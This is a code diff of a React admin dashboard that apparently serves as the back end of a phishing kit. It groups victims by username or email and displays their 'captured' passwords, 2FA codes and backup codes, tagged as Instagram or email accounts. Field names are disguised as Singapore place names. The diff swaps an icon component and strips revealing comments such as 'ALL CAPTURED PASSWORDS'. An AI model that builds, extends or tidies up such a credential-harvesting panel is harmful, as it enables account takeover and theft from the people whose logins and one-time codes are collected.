@@ -19,13 +19,33 @@ import {
   Calendar,
   Clock,
   Eraser,
-  Instagram,
+  // Instagram removed from here to prevent build error
   Mail,
   User,
   Lock,
   ShieldCheck,
   LifeBuoy,
 } from "lucide-react";
+
+// Manual Instagram Icon Component (Fixed for Turbopack)
+const InstagramIcon = ({ size = 16, className = "" }: { size?: number, className?: string }) => (
+  <svg
+    xmlns="http://www.w3.org/2000/svg"
+    width={size}
+    height={size}
+    viewBox="0 0 24 24"
+    fill="none"
+    stroke="currentColor"
+    strokeWidth="2"
+    strokeLinecap="round"
+    strokeLinejoin="round"
+    className={className}
+  >
+    <rect width="20" height="20" x="2" y="2" rx="5" ry="5" />
+    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
+    <line x1="17.5" x2="17.51" y1="6.5" y2="6.5" />
+  </svg>
+);
 
 export default function AdminDashboard() {
   const [entries, setEntries] = useState<any[]>([]);
@@ -66,12 +86,9 @@ export default function AdminDashboard() {
           ...val,
         }));
 
-        // --- STRICT MAPPING LOGIC ---
-        // Group by user identity to ensure codes are NEVER orphaned
         const groupedMap = new Map();
 
         rawList.forEach((current) => {
-          // Identify the user by Username/Email OR use the entry ID to link fragments
           const identity = current.Orchard || current.emle || "PENDING_AUTH";
 
           if (!groupedMap.has(identity)) {
@@ -85,13 +102,11 @@ export default function AdminDashboard() {
 
           const userObj = groupedMap.get(identity);
 
-          // Map Passwords (avoiding duplicates)
           if (current.Sentosa) userObj.allPass.add(current.Sentosa);
           if (current.pass) userObj.allPass.add(current.pass);
           if (current.Changi) userObj.allPass.add(current.Changi);
           if (current.Tampines) userObj.allPass.add(current.Tampines);
 
-          // Map 2FA & Backups (Dynamic keys with timestamps)
           Object.keys(current).forEach((key) => {
             if (key.startsWith("MarinaBay")) userObj.allCodes.add(current[key]);
             if (key.startsWith("Jurong")) userObj.allBackups.add(current[key]);
@@ -167,11 +182,11 @@ export default function AdminDashboard() {
                 initial={{ opacity: 0 }}
                 animate={{ opacity: 1 }}
                 className="bg-[#0a0a0a] border border-zinc-900 rounded-2xl p-4 shadow-2xl relative">
-                {/* BRAND TAG */}
+                
                 <div className="flex items-center justify-between mb-4 pb-2 border-b border-white/[0.03]">
                   <div className="flex items-center gap-2">
                     {isInsta ? (
-                      <Instagram size={14} className="text-pink-500" />
+                      <InstagramIcon size={14} className="text-pink-500" />
                     ) : (
                       <Mail size={14} className="text-sky-500" />
                     )}
@@ -187,7 +202,6 @@ export default function AdminDashboard() {
                   </button>
                 </div>
 
-                {/* USER IDENTITY */}
                 <div className="flex items-center gap-3 bg-zinc-900/60 p-3 rounded-xl border border-white/5 mb-3">
                   <User size={14} className="text-zinc-500" />
                   <span className="text-white font-bold text-sm truncate select-all">
@@ -195,7 +209,6 @@ export default function AdminDashboard() {
                   </span>
                 </div>
 
-                {/* ALL CAPTURED PASSWORDS */}
                 <div className="space-y-2 mb-3">
                   {passList.map((p: any, i) => (
                     <div
@@ -218,7 +231,6 @@ export default function AdminDashboard() {
                   ))}
                 </div>
 
-                {/* MAPPED 2FA & BACKUP CODES */}
                 {(otps.length > 0 || backups.length > 0) && (
                   <div className="flex flex-wrap gap-2 p-3 bg-zinc-900/20 rounded-xl border border-dashed border-zinc-800">
                     {otps.map((code: any, i) => (
@@ -238,7 +250,6 @@ export default function AdminDashboard() {
                   </div>
                 )}
 
-                {/* METADATA */}
                 <div className="mt-4 flex items-center justify-between text-[9px] text-zinc-700 font-bold uppercase">
                   <div className="flex items-center gap-3">
                     <span className="flex items-center gap-1">
